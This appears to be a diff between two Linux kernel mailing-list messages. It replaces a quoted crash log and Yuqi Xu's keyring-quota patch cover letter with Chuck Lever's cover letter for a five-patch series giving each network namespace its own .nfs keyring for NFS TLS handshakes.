-> [  291.622399][T10195]  ? lock_vma_under_rcu+0x143/0x980
-> [  291.622797][T10195]  __handle_mm_fault+0xfa3/0x2a10
-> [  291.623201][T10195]  ? __pfx_lock_release+0x10/0x10
-> [  291.623574][T10195]  ? down_read_trylock+0x1f0/0x3f0
-> [  291.623959][T10195]  ? __pfx___handle_mm_fault+0x10/0x10
-> [  291.624373][T10195]  ? __pfx_down_read_trylock+0x10/0x10
-> [  291.624818][T10195]  ? __pfx_lock_vma_under_rcu+0x10/0x10
-> [  291.625252][T10195]  handle_mm_fault+0x3f5/0xa00
-> [  291.625639][T10195]  do_user_addr_fault+0x50a/0x1490
-> [  291.626067][T10195]  exc_page_fault+0x5d/0xe0
-> [  291.626421][T10195]  asm_exc_page_fault+0x26/0x30
-> [  291.626781][T10195] RIP: 0033:0x7f7f7505e080
-> [  291.627107][T10195] Code: Unable to access opcode bytes at 0x7f7f7505e=
-056.
-> [  291.627583][T10195] RSP: 002b:00007ffc585a1b08 EFLAGS: 00010202
-> [  291.628015][T10195] RAX: 00007ffc585a2120 RBX: 00007ffc585a2040 RCX: 0=
-000000000000002
-> [  291.628553][T10195] RDX: 00007ffc585a2100 RSI: 0000000000000025 RDI: 0=
-000560a6a8580a7
-> [  291.629082][T10195] RBP: 00007ffc585a2210 R08: 00007ffc585a2230 R09: 0=
-000000000000058
-> [  291.629623][T10195] R10: 00007ffc585a2210 R11: 0000000000000246 R12: 0=
-000560a6bf4d2a0
-> [  291.630161][T10195] R13: 0000560a6bf5d0b0 R14: 00007ffc585a2100 R15: 0=
-000560a6a8580a7
-> [  291.630738][T10195]  </TASK>
-> [  291.631265][T10195] Kernel Offset: disabled
-> [  291.631642][T10195] Rebooting in 86400 seconds..
->
-> -----END crash log-----
->
-> Best regards,
-> Yuqi Xu
->
-> Yuqi Xu (1):
->   KEYS: Account for asymmetric key payload data in the quota
->
->  crypto/asymmetric_keys/pkcs8_parser.c    |  2 +-
->  crypto/asymmetric_keys/x509_public_key.c | 23 ++++++++++++++++++++++-
->  2 files changed, 23 insertions(+), 2 deletions(-)
->
->
-> base-commit: 10396a2d6d41d594975b6ece712278570c3c970c
-> --
-> 2.55.0
->
->
+The keyring is owned by the owner of the network namespace's user
+namespace, and grants no permission to anyone else. In a container
+with its own user namespace, the container's root can provision the
+keyring and its tlshd can link it, while global root on the host
+cannot write to it without entering that user namespace. For a
+namespace in the initial user namespace the owner is global root,
+as before.
 
-Thanks
+Still open is how userspace names the kernel-held keyring. Patch 5
+prototypes a request_key type handled in the kernel and tagged
+KEY_TYPE_NET_DOMAIN. A keyctl modeled on KEYCTL_GET_PERSISTENT, or a
+read-only attribute on the netns-tagged nfs_client sysfs kobject,
+would do the same job if the keyrings maintainers prefer one. Keys
+that userspace adds are quota-charged by user namespace while the
+keyring lives in nfs_net. Confirmation that this is sane when the
+two boundaries differ would be welcome.
+
+nfstlskey, the provisioning tool that consumes the key type, is
+merged in https://github.com/linux-nfs/ktls-utils/ .
+
+Tested on a v7.3-rc4 kernel carrying this series, on one Fedora VM
+acting as both NFS client and NFSD, with tlshd from ktls-utils
+1.4.0.
+
+---
+Changes in v2:
+- Write "serial number" rather than "serial" throughout (Randy)
+- Give the .nfs keyring to the netns's user_ns owner (sashiko)
+- Link to v1: https://patch.msgid.link/20260918-nfs-mtls-identity-v1-0-197e568d78a7@kernel.org
+
+---
+Chuck Lever (5):
+      NFS: name the init_nfs_fs() error labels
+      NFS: allocate the .nfs keyring per network namespace
+      SUNRPC: pass a keyring serial number to the TLS handshake
+      NFS: name the namespace .nfs keyring in the x509 handshake
+      NFS: add a key type that reveals the namespace .nfs keyring serial number
+
+ Documentation/filesystems/nfs/index.rst   |   1 +
+ Documentation/filesystems/nfs/keyring.rst |  69 ++++++++++
+ fs/nfs/client.c                           |   9 +-
+ fs/nfs/fs_context.c                       |   1 +
+ fs/nfs/inode.c                            | 211 ++++++++++++++++++++++--------
+ fs/nfs/netns.h                            |   9 ++
+ fs/nfs/nfs3client.c                       |   1 +
+ fs/nfs/nfs4client.c                       |   1 +
+ include/linux/sunrpc/xprt.h               |   1 +
+ net/sunrpc/xprtsock.c                     |   1 +
+ 10 files changed, 248 insertions(+), 56 deletions(-)
+---
+base-commit: aa98230e410f0ed212b6788c46b1e4d49e0ff7ca
+change-id: 20260917-nfs-mtls-identity-04c14f6f348d
+
+Best regards,
+--  
+Chuck Lever <cel@kernel.org>
+
